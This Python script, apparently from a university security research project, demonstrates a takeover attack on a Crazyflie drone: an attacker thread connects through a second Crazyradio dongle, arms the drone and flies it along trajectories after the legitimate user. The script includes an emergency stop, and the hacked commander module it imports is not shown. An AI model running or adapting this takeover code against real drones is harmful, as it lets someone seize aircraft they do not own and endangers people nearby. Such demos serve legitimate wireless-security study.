
#!/usr/bin/env python3
"""
takeover_demo.py
Author: fatemehazam-crypto
Email: faa5778@utulsa.edu

Description:
This script uses the hacke_highlevel_commander to demonstrates a complete takeover attack on
a Crazyflie drone.It shows how an attacker can seize control from a legitimate user by connecting
via a different Crazyradio dongle. Features emergency stop functionality and high-level commander
control for precise trajectory-based maneuvers.

Features:
- Legitimate user control simulation with high-level commands
- Attacker takeover capability using trajectory control
- Emergency stop functionality with Ctrl+C safety
- Threaded execution for realistic timing
- Global drone management for emergency situations

Usage:
Run this script to demonstrate a drone takeover attack. The legitimate user
takes off first using high-level commands, then the attacker seizes control after a 
timed delay using trajectory-based commands.

DRONE DISCOVERY:
You don't need to know the exact drone address beforehand. Use the scanner.py 
utility to identify active drones and their communication parameters:

    python scanner.py --scan  # Scan for all available drones
    

Note: -Requires two Crazyradio dongles and a Crazyflie drone.
      - Needs a positiong system and related decks. Tested with Loco anchors and loco deck.
     
"""

import time
import threading
import logging
from cflib.crazyflie import Crazyflie
from cflib import crtp
from cflib.crazyflie.syncCrazyflie import SyncCrazyflie
import signal
import sys

logging.basicConfig(level=logging.INFO)


# Global variable to control emergency stop
emergency_stop_triggered = False
active_drones= {}

def emergency_stop(sig=None, frame=None):
    """Emergency stop function that stops all drones immediately"""
    global emergency_stop_triggered
    print("Emergency stop triggered! Stopping all drones...")
    emergency_stop_triggered = True
    
    # Immediately stop all active drones
    for uri, cf in active_drones.items():
        try:
            print(f"Stopping motors for {uri}")
            cf.commander.send_stop_setpoint()  # Stop motors immediately
        except Exception as e:
            print(f"Error stopping {uri}: {e}")
    
    sys.exit(0)  # Exit the entire program

# catch Ctrl+C
signal.signal(signal.SIGINT, emergency_stop)


def legitimate_control():
    """Normal user controlling the drone - MUST DISCONNECT before attack"""
    normal_uri = "radio://0/80/2M/"
    
    cf_normal = Crazyflie(rw_cache='./cache')
    active_drones[normal_uri]=cf_normal
    try:
        cf_normal.open_link(normal_uri)
        time.sleep(2)
        cf_normal.platform.send_arming_request(True)
        time.sleep(1.0)
        
        print("Legitimate user: Taking off...")
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander

        #from hacked_motion_commander import HackedMotionCommander
        commander = HackedHighLevelCommander(cf_normal)
        commander.takeoff(0.5,3)
        time.sleep(2.5)
        print("✅Legitimate user: Drone airborne")
        
        # ⚠️ CRITICAL: Keep legitimate control for limited time
        time.sleep(8)  # Only hover for 8 seconds
        
        # ⚠️ MUST DISCONNECT before attacker takes over
        print("🛑 Legitimate user: Forced to Disconnect from {normal_uri}")
        commander.land(0,3)
        time.sleep(3.5)
        cf_normal.close_link()  # ⚡ DISCONNECT LEGITIMATE USER
        if normal_uri in active_drones:
            del active_drones[normal_uri]

        
    except Exception as e:
        print(f"Legitimate control error: {e}")

def attack_control():
    """Attacker taking over control"""
    time.sleep(7)  # Wait for legitimate user to DISCONNECT first
    
    #attack_uri = "radio://1/80/2M/E7E7E7E7E7"
    attack_uri = "radio://1/80/2M/"

    cf_attack = Crazyflie(rw_cache='./cache')
    active_drones[attack_uri]=cf_attack
    

    try:
        # ⚡ Only connect AFTER legitimate user disconnects
        cf_attack.open_link(attack_uri)
        time.sleep(2)
        cf_attack.platform.send_arming_request(True)
        time.sleep(1.0)
        
        print("⚡ ATTACKER: Taking over control...")
        #from hacked_motion_commander import HackedMotionCommander
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
        commander = HackedHighLevelCommander(cf_attack)
        commander.takeoff(1.0,3)
        time.sleep(3.5)
 
        print("✅ ATTACKER: Takeover successful!")
        #time.sleep(2)
        # Now perform maneuvers
        commander.go_to(0.5,0.5,1.0,0,5)
        time.sleep(5.5)
        #mc.turn_right(90)
        commander.go_to(0.5,1.0,1.0,0,5)
        time.sleep(5.5)   
        commander.land(0,5)
        time.sleep(5.5)
        cf_attack.close_link()
        if attack_uri in active_drones:  
            del active_drones[attack_uri]

    except Exception as e:
        print(f"Attack control error: {e}")
    finally:
        if cf_attack.is_connected():
            cf_attack.close_link()


def run_demo():
    print("BRUSHLESS TAKEOVER DEMO")
    print("==========================")
    print("PHASE 1: Legitimate takeoff and hover")
    print("PHASE 2: Attacker connection and takeover")
    print("")
    
    crtp.init_drivers()
    time.sleep(1)
    
    legit_thread = threading.Thread(target=legitimate_control)
    attack_thread = threading.Thread(target=attack_control)
    
    # Start legitimate control first
    print("🔹 Starting legitimate control...")
    legit_thread.start()
    time.sleep(5)  # Wait for takeoff to complete
    
    # Then start attack control
    print("🔹 Starting attack control (delayed)...")
    attack_thread.start()
    
    legit_thread.join()
    attack_thread.join()
    
    print("✅ Demo completed successfully!")
    return

if __name__ == "__main__":
    run_demo()
